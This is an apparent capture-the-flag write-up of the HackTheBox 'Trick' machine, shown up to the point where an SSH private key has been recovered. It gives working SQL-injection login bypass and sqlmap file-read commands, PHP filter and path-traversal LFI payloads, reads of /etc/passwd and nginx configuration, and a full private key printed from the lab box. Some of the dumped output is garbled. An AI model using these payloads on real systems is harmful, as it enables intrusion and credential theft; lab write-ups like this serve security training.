### Trick HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.166

Nmap Scan:

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ nmap -sCV -A 10.10.11.166 -p22,25,53,80 -oN nmapscan                                              
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 05:48 WAT
Nmap scan report for 10.10.11.166
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.40 seconds
```

Heading over to the web server shows a static web page
![image](https://user-images.githubusercontent.com/113513376/217151573-f5bc970a-6468-48e7-bec2-0de94d305cc4.png)

Since there's dns i'll assume the domain name is trick.htb and do a dns zone transfer

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat /etc/hosts | grep .htb
10.10.11.166    trick.htb
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ dig axfr trick.htb @10.10.11.166

; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 608 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Tue Feb 07 05:54:37 WAT 2023
;; XFR size: 6 records (messages 1, bytes 231)
```

A new subdomain is found i'll add that to my `/etc/hosts` file 

On heading over to the new subdomain i got a login page
![image](https://user-images.githubusercontent.com/113513376/217152112-66ecad6e-17fb-4219-8629-01ae993fa119.png)

Bypassing it with basic sqli works and we get logged in
![image](https://user-images.githubusercontent.com/113513376/217152336-5051a77e-c4b6-4b17-a613-881a7fb3ac7c.png)

```
Payload: ' or 1=1 -- (both as username & password)
```

Noticing the url schema looks fishy. Its including the home page via a GET parameter(?page) so this is likely an LFI vulnerability

I tried including /etc/passwd manually but it failed
![image](https://user-images.githubusercontent.com/113513376/217152599-07376acf-c1b8-4319-92b9-9827065dee09.png)

But i can also try to dump the encoded form of the index.php file using php filter

And it worked
![image](https://user-images.githubusercontent.com/113513376/217152894-2e7f6906-dd2c-4b88-a02b-a4b6a623ea93.png)

```
Payload: http://preprod-payroll.trick.htb./index.php?page=php://filter/convert.base64-encode/resource=index
```

Now i'll decode the base64 encoded php code

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat index| base64  -d > index.php
```

Here's the decoded value for index.php
![image](https://user-images.githubusercontent.com/113513376/217156126-87334238-eb49-4a7c-b762-1bd6391a5883.png)
![image](https://user-images.githubusercontent.com/113513376/217156230-671d5a41-47cf-433a-97e5-e9ffd53476ba.png)

```
<?php
	session_start();
  if(!isset($_SESSION['login_id']))
    header('location:login.php');
 include('./header.php'); 
 // include('./auth.php'); 
 ?>
<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
<?php include $page.'.php' ?>
```

So basically the first php code sets the header location to login.php i then tried reading the content of login.php via the lfi which lead to reading db_connect.php
![image](https://user-images.githubusercontent.com/113513376/217156572-c0b66cda-3bf0-4116-b59d-a37fd3337d96.png)
![image](https://user-images.githubusercontent.com/113513376/217156600-a2d413ce-5db4-4c08-ac49-ffeefda87580.png)

We have db cred but no mysql open on the target and it doesn't work as ssh cred so it isn't very useful as of now

Back to the lfi, i wasn't able to include system files cause of this if i'm not mistaken this, `<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>` the value of $page is either obtained from the $_GET['page'] array, or it is set to "home" if $_GET['page'] is not set. The $_GET array is used to collect data passed from a URL's query string.

So we bypassed the login page using sqli how about dumping the tables using sqlmap ?

I'll intercept the login request on burp then save the request
![image](https://user-images.githubusercontent.com/113513376/217157577-fdfeb2ab-a5c4-478e-8145-450baba85182.png)
![image](https://user-images.githubusercontent.com/113513376/217157696-480477ea-0fc0-4506-ba73-4c3c4c2e0902.png)

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ nano request
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat request                
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 25
Origin: http://preprod-payroll.trick.htb.
Connection: close
Referer: http://preprod-payroll.trick.htb./login.php
Cookie: PHPSESSID=il4jvdgq6keotif0t0tqdu7ple

username=lol&password=lol
```

Now i'll run sqlmap on the request

After few minutes sql showed it was vulnerable to a time based attack and boolean based sqli 

So i had to re-run the sqlmap and used Boolean based sqli as a technique sqlmap should use so as to save time

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ sqlmap -r request --batch --technique B --level 5 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:49:58 /2023-02-07/

[06:49:58] [INFO] parsing HTTP request from 'request'
[06:49:58] [INFO] testing connection to the target URL
[06:49:59] [INFO] testing if the target URL content is stable
[06:50:00] [INFO] target URL content is stable
[06:50:00] [INFO] testing if POST parameter 'username' is dynamic
[06:50:01] [WARNING] POST parameter 'username' does not appear to be dynamic
[06:50:01] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[06:50:02] [INFO] testing for SQL injection on POST parameter 'username'
[06:50:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:51:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:51:10] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --not-string="21")
[06:51:23] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y
[06:51:23] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 155 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:51:38] [INFO] testing MySQL
[06:51:38] [INFO] confirming MySQL
[06:51:40] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[06:51:40] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 06:51:40 /2023-02-07/
```

Now we can do things like dump db and stuff but i like to check the privileges of a user 

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ sqlmap -r request --batch --technique B --level 5 --privileges
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:53:33 /2023-02-07/

[06:53:33] [INFO] parsing HTTP request from 'request'
[06:53:33] [INFO] resuming back-end DBMS 'mysql' 
[06:53:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:53:35] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[06:53:35] [INFO] fetching database users privileges
[06:53:35] [INFO] fetching database users
[06:53:35] [INFO] fetching number of database users
[06:53:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:53:35] [INFO] retrieved: 1
[06:53:38] [INFO] retrieved: 'remo'@'locaihost'
[06:54:42] [INFO] fetching number of privileges for user 'remo'
[06:54:42] [INFO] retrieved: 1
[06:54:44] [INFO] fetching privileges for user 'remo'
[06:54:44] [INFO] retrieved: FILE
database management system users privileges:
[*] %remo% [1]:
    privilege: FILE

[06:55:02] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 06:55:02 /2023-02-07/
```

Cool the user has FILE privilege meaning he can read the local files lets test it to confirm

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ sqlmap -r request --batch --technique B --level 5 --file-read=/etc/passwd
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:57:27 /2023-02-07/

[06:57:27] [INFO] parsing HTTP request from 'request'
[06:57:27] [INFO] resuming back-end DBMS 'mysql' 
[06:57:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:57:28] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[06:57:28] [INFO] fingerprinting the back-end DBMS operating system
[06:57:29] [INFO] the back-end DBMS operating system is Linux
[06:57:29] [INFO] fetching file: '/etc/passwd'
[06:57:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:57:29] [INFO] retrieved: 726F6F743A783A303A303A726F6F743A2F726F6F743A2F60696E2F626173680A6461656DbF6E3A
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[07:00:22] [INFO] retrieved: 2351
[07:00:28] [INFO] the remote file '/etc/passwd' is larger (2351 B) than the local file '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_passwd' (39B)
files saved to [1]:
[*] /home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_passwd (size differs from remote file)

[07:00:28] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 07:00:28 /2023-02-07/

└─$ cat /home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

Now i'm interested in the db present

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]                                                                                                                                                                  
└─$  sqlmap -r request --batch --technique B --level 5 --dbs                                                                                                                                                       
        ___                                                                                                                                                                                                        
       __H__                                                                                                                                                                                                       
 ___ ___[)]_____ ___ ___  {1.7#stable}                                                                                                                                                                             
|_ -| . [,]     | .'| . |                                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
                                                                                                                                                                                                                   
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:59:29 /2023-02-07/

[06:59:29] [INFO] parsing HTTP request from 'request'
[06:59:30] [INFO] resuming back-end DBMS 'mysql' 
[06:59:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[06:59:32] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[06:59:32] [INFO] fetching database names
[06:59:32] [INFO] fetching number of databases
[06:59:32] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[06:59:32] [INFO] retrieved: 2
[06:59:35] [INFO] retrieved: information_schema
[07:00:22] [INFO] retrieved: @ayroll_db
available databases [2]:
[*] payroll_db
[*] information_schema

[07:01:00] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 07:01:00 /2023-02-07/


```

Since it probably has vhost, then it should be stored in the web server config file 

And this web server uses nginx

![image](https://user-images.githubusercontent.com/113513376/217161449-f9d8cea6-4854-4a88-a807-3c363dca7abb.png)

Now i can read the nginx conf file using the sqli vulnerability. By default its located in `/etc/nginx/sites-enabled/default`

```
──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]                                                                                                                                                                  
└─$ sqlmap -r request --batch --technique B --level 5 --file-read=/etc/nginx/sites-enabled/default --threads 10                                                                                                    
        ___                                                                                                                                                                                                        
       __H__                                                                                                                                                                                                       
 ___ ___[']_____ ___ ___  {1.7#stable}                                                                                                                                                                             
|_ -| . [,]     | .'| . |                                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
                                                                                                                                                                                                                   
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no
 liability and are not responsible for any misuse or damage caused by this program                                                                                                                                 
                                                                                                                                                                                                                   
[*] starting @ 07:04:54 /2023-02-07/                                                                                                                                                                               
                                                                                                                                                                                                                   
[07:04:54] [INFO] parsing HTTP request from 'request'                                                                                                                                                              
[07:04:55] [INFO] resuming back-end DBMS 'mysql'                                                                                                                                                                   
[07:04:55] [INFO] testing connection to the target URL                                                                                                                                                             
sqlmap resumed the following injection point(s) from stored session:                                                                                                                                               
---                                                                                                                                                                                                                
Parameter: username (POST)                                                                                                                                                                                         
    Type: boolean-based blind                                                                                                                                                                                      
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)                                                                                                                                   
    Payload: username=lol' AND 1401=(SELECT (CASE WHEN (1401=1401) THEN 1401 ELSE (SELECT 3464 UNION SELECT 5831) END))-- pFpw&password=lol
---
[07:04:56] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL 5 (MariaDB fork)
[07:04:56] [INFO] fingerprinting the back-end DBMS operating system
[07:04:56] [INFO] the back-end DBMS operating system is Linux
[07:04:56] [INFO] fetching file: '/etc/nginx/sites-enabled/default'
[07:04:56] [INFO] retrieving the length of query output
[07:04:56] [INFO] retrieved: 2116
[07:05:03] [INFO] resuming partial value: 736572766572207B0A096C697374656E203
[07:13:46] [INFO] retrieved: ..7068702E636F6E663B0A20202020202020201?000?0020202020666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0A20202020202020207D0A7D0A                [07:13:46] [INFO] retrieved: 736572766572207B0A096C697374656E2038302064656661756C745F7365727665723B0A096C697374656E205B3A3A5C3A161?0004656661756C745F7365727665723B0A097365727665725F6E616D6520747269636B2E6874623B0A09726F6F74202F7661722F7777772F68746D6C3B0A0A09696E64657820696E6465782E68746D6C20696E6465782E68746D20696E6465782E6E67696E782D63655169016B2B68746D6C3B0A0A097365727665725F6E616D65205F3B0A0A096C6F636174696F6E202F207B0A09097472795F66696C6573202475726920247572692F203D3430343B0A097D0A0A096C6F636174696F6E207E205C2E70687024207B0A0909696E636C75646520736E595?600044732F666173746367692D7068702E636F6E663B0A0909666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0A097D0A7D0A0A0A736572766572207B0A096C697374656E2038303B0A096C697374656E205B3A3A5C1534303B0A0A097365727665725F6E616D652070726570726F642D6D61726B6574696E672E747269636B2E6874623B0A0A09726F6F74202F7661722F7777772F6D61726B65743B0A09696E64657820696E6465782E7068703B0A0A096C6F636174696F6E202F207B0A09097472795F66696C65732?1155?04420247572692F203D3430343B0A097D0A0A20202020202020206C6F636174696F6E207E205C2E70687024207B0A20202020202020202020202020202020696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A2020202020202020202020202020202066617373516759547061737320756E69783A2F72756E2F7068702F706870372E332D66706D2D6D69636861656C2E736F636B3B0A20202020202020207D0A7D0A0A736572766572207B0A20202020202020206C697374656E2038303B0A20202020202020206C697374656E205B3A3A5D3A38303B0A0A20202020202?101?6?04407665725F6E616D652070726570726F642D706179726F6C6C2E747269636B2E6874623B0A0A2020202020202020726F6F74202F7661722F7777772F706179726F6C6C3B0A2020202020202020696E64657820696E6465782E7068703B0A0A20202020202020206C6F636174696F6E202F2?59?6??0020202020202020202020202020207472795F66696C6573202475726920247572692F203D3430343B0A20202020202020207D0A0A20202020202020206C6F636174696F6E207E205C2E70687024207B0A20202020202020202020202020202020696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A20202020202020201?000?0020202020666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0A20202020202020207D0A7D0A
 [07:13:46] [WARNING] there was a problem decoding value '736572766572207B0A096C697374656E2038302064656661756C745F7365727665723B0A096C697374656E205B3A3A5C3A161?0004656661756C745F7365727665723B0A097365727665725F6E616D6520747269636B2E6874623B0A09726F6F74202F7661722F7777772F68746D6C3B0A0A09696E64657820696E6465782E68746D6C20696E6465782E68746D20696E6465782E6E67696E782D63655169016B2B68746D6C3B0A0A097365727665725F6E616D65205F3B0A0A096C6F636174696F6E202F207B0A09097472795F66696C6573202475726920247572692F203D3430343B0A097D0A0A096C6F636174696F6E207E205C2E70687024207B0A0909696E636C75646520736E595?600044732F666173746367692D7068702E636F6E663B0A0909666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0A097D0A7D0A0A0A736572766572207B0A096C697374656E2038303B0A096C697374656E205B3A3A5C1534303B0A0A097365727665725F6E616D652070726570726F642D6D61726B6574696E672E747269636B2E6874623B0A0A09726F6F74202F7661722F7777772F6D61726B65743B0A09696E64657820696E6465782E7068703B0A0A096C6F636174696F6E202F207B0A09097472795F66696C65732?1155?04420247572692F203D3430343B0A097D0A0A20202020202020206C6F636174696F6E207E205C2E70687024207B0A20202020202020202020202020202020696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A2020202020202020202020202020202066617373516759547061737320756E69783A2F72756E2F7068702F706870372E332D66706D2D6D69636861656C2E736F636B3B0A20202020202020207D0A7D0A0A736572766572207B0A20202020202020206C697374656E2038303B0A20202020202020206C697374656E205B3A3A5D3A38303B0A0A20202020202?101?6?04407665725F6E616D652070726570726F642D706179726F6C6C2E747269636B2E6874623B0A0A2020202020202020726F6F74202F7661722F7777772F706179726F6C6C3B0A2020202020202020696E64657820696E6465782E7068703B0A0A20202020202020206C6F636174696F6E202F2?59?6??0020202020202020202020202020207472795F66696C6573202475726920247572692F203D3430343B0A20202020202020207D0A0A20202020202020206C6F636174696F6E207E205C2E70687024207B0A20202020202020202020202020202020696E636C75646520736E6970706574732F666173746367692D7068702E636F6E663B0A20202020202020201?000?0020202020666173746367695F7061737320756E69783A2F72756E2F7068702F706870372E332D66706D2E736F636B3B0A20202020202020207D0A7D0A' from expected hexadecimal form
do you want confirmation that the remote file '/etc/nginx/sites-enabled/default' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[07:13:46] [INFO] retrieving the length of query output
[07:13:46] [INFO] retrieved: 4
[07:13:52] [INFO] retrieved: 1058           
[07:13:52] [INFO] the remote file '/etc/nginx/sites-enabled/default' is smaller (1058 B) than file '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_nginx_sites-enabled_default' (2116 B)
files saved to [1]:
[*] /home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_nginx_sites-enabled_default (size differs from remote file)

[07:13:52] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb.'

[*] ending @ 07:13:52 /2023-02-07/
```

So basically the output is in form of hex thats why sqlmap can't decode but i can decode using xxd

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat /home/mark/.local/share/sqlmap/output/preprod-payroll.trick.htb./files/_etc_nginx_sites-enabled_default | xxd -r -p
server {
        listen 80 default_server;
        listen [::\:efault_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-ceQik+html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snY`Ds/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}


server {
        listen 80;
        listen [::\40;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_filesUBGW&CC_6FB6VFR6WG2f7F6v6cf75uG72V__'Vr2_6V66__6W'fW"_7FV_7FV_@ver_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location /Y              try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
            fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

Looking at it we see there's another vhost meaning there are 3 vhosts on this box and i've got only 2

```┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat /etc/hosts | grep .htb                                                                                             
10.10.11.166    trick.htb preprod-payroll.trick.htb

server {
	.listen 80;
        listen [::\40;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;
```

I updated my /etc/hosts

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ cat /etc/hosts | grep .htb
10.10.11.166    trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
```

Now lets see what the new vhost has
![image](https://user-images.githubusercontent.com/113513376/217225653-ab2421e3-1e5c-4c98-83a2-b08ecebed2e0.png)

Cool! On clicking services we see it includes the server.html file via a GET parameter
![image](https://user-images.githubusercontent.com/113513376/217225929-c23e4228-1199-4024-9128-b4027866b508.png)

Just like how the first vhost was vulnerable to lfi i'll read the source code again 

But it doesn't work here
![image](https://user-images.githubusercontent.com/113513376/217226732-752a3efe-594f-428d-aa77-1c05eb9f4ca9.png)

Since we know the full path of this vhost (from what we got in the nginx config file) i can actually still read it via the other vhost using php filter 
![image](https://user-images.githubusercontent.com/113513376/217227022-fbbd5ba0-4c1e-44b6-a118-e0b3776c2066.png)

```
Payload: http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=/var/www/market/index
```

I decoded it the same way i did previously
![image](https://user-images.githubusercontent.com/113513376/217227265-fc020177-eb4c-46bb-9a81-03d54fcaef07.png)

From the code we see the way it handles the incluion of file

```
1. The PHP script retrieves a value from the $_GET superglobal array with the key "page"
2. It checks if the value of $file is set and equal to "index.php", and if either condition is true, it includes the contents of the file "/var/www/market/home.html".
3. If the conditions are not met, it includes the contents of "/var/www/market/".str_replace("../","",$file)
4. The str_replace function is used to remove "../" from the value of $file to prevent directory traversal attack
```

Cool with that we know that there's file inclusion even though `../` is filtered we can still get a file inclusion using `..../` case it will remote the `..` making the final output `../` 

Lets check it out 
![image](https://user-images.githubusercontent.com/113513376/217228658-f5e5739a-4c35-434e-ab4e-f1bc9aee50fd.png)

Now we can try to leverage this LFI to get RCE

Luckily we have the user's ssh key
![image](https://user-images.githubusercontent.com/113513376/217228919-b02ac7b8-8fcf-411f-8a6d-213e72ba02e3.png)

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

And now we can login as the user

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
└─$ chmod 600 id_rsa       
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Trick]
